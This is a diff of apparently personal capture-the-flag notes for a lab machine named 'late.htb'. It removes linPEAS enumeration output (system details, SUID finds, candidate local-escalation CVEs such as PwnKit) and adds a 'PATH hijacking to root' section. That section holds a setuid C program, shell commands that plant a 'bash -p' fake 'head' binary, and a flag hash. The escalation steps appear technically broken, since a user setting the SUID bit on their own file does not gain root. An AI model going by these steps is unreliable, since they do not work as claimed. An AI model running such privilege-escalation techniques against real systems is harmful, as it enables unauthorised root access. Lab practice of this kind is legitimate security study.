@@ -30,72 +30,29 @@ image.late.htb
 ssh svc_acc@10.10.11.156 -i id_rsa
 user.txt
 [+]PRIVIALGE ESCALATION[+]
-linPeas.sh
 
-Description:	Ubuntu 18.04.5 LTS
-Release:	18.04
-Codename:	bionic
+751d3067405551fd209e7b3422ad24aa > root.txt
 
-Sudo version 1.8.21p2
-
-$PATH
-/home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-New path exported: /home/svc_acc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-
-Processes with credentials in memory (root req)
-sshd: process found (dump creds from memory as root)
-
-Searching mysql credentials and exec
-/etc/mysql/my.cnf
-
-Searching uncommon passwd files (splunk)
-passwd file: /etc/pam.d/passwd
-passwd file: /etc/passwd
-passwd file: /usr/share/bash-completion/completions/passwd
-passwd file: /usr/share/lintian/overrides/passwd
-
-
-Analyzing PGP-GPG Files (limit 70)
-/usr/bin/gpg
-
-Analyzing Interesting logs Files (limit 70)
--rw-r--r-- 1 root root 34385532 Apr 30 12:21 /var/log/nginx/access.log
--rw-r--r-- 1 root root 785 Apr 30 12:17 /var/log/nginx/error.log
-
-SUID - Check easy privesc, exploits and write perms
-/tmp/bash
-CVE-2002-1614
-
-
-Modified interesting files in the last 5mins
-/var/mail/root
-
-
-Useful software
-/usr/bin/base64
-/usr/bin/curl
-/usr/bin/g++
-/usr/bin/gcc
-/usr/bin/lxc
-/usr/bin/make
-/bin/nc
-/bin/netcat
-/usr/bin/perl
-/bin/ping
-/usr/bin/python
-/usr/bin/python2
-/usr/bin/python2.7
-/usr/bin/python3
-/usr/bin/python3.6
-/usr/bin/sudo
-/usr/bin/wget
-
-
+[+]PATH HIJACKING TO ROOT[+]
 Writable folder: /dev/shm
 
+svc_acc@late:~$ cat app.c 
+#include <stdio.h>
+void main(){
+	setuid(0);
+	system("/usr/bin/head /root/root.txt");
+	system("head /root/root.txt");
+	}
 
-CVE
-[CVE-2021-4034] PwnKit
-[CVE-2021-3156] sudo Baron Samedit
-[CVE-2021-3156] sudo Baron Samedit 2
-[CVE-2017-5618] setuid screen v4.5.0 LPE
+svc_acc@late:/dev/shm$ gcc app.c -o app
+svc_acc@late:/dev/shm$ chmod u+s app
+svc_acc@late:/dev/shm$ export PATH=.:$PATH
+svc_acc@late:/dev/shm$ echo 'bash -p' > head
+svc_acc@late:/dev/shm$ chmod +x head 
+svc_acc@late:/dev/shm$ ./app
+#root.txt
+
+
+
+
+
